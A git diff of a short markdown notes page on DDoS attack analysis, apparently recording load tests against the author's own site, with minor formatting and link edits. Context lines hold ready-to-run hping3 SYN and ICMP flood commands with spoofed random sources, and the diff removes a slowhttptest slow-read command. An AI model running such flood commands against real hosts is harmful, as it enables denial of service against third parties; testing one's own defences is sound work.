@@ -4,6 +4,7 @@ DDOS attack analysis
 <h3>Protocol attacks</h3>
 
 <h4>TCP SYN flood</h4>
+
 ```
 hping3 --rand-source --flood -S -q -n -d 120 mysite -p 80
 ```
@@ -12,6 +13,7 @@ No impact observed on opening ``mysite``. Floods network but mysite can still be
 <h3>Volume-based (bandwidth) attacks</h3>
 
 <h4>ICMP (ping) flood</h4>
+
 ```
  hping3 --rand-source --flood -1 mysite -p 80
 ```
@@ -74,8 +76,4 @@ No impact observed on opening ``mysite``. Server takes from pool and processes c
 Resources
 1. [Mitigating DDoS Attacks with NGINX](https://blog.nginx.org/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus)
 2. [Slow http attacks](https://github.com/jatj/sdn_onos/blob/master/SLOW_HTTP_ATTACKS.md)
-3. [Slow http attacks_2](https://gist.github.com/serogers/ba4e124d6be79eacbf712a558239a67d)
-
-
-
-slowhttptest -X -u http://localhost:8080/  -c 5000 -r 100 -n 1 -z 5 -g -o slowread-test5
+3. [Slow http attacks2](https://gist.github.com/serogers/ba4e124d6be79eacbf712a558239a67d)
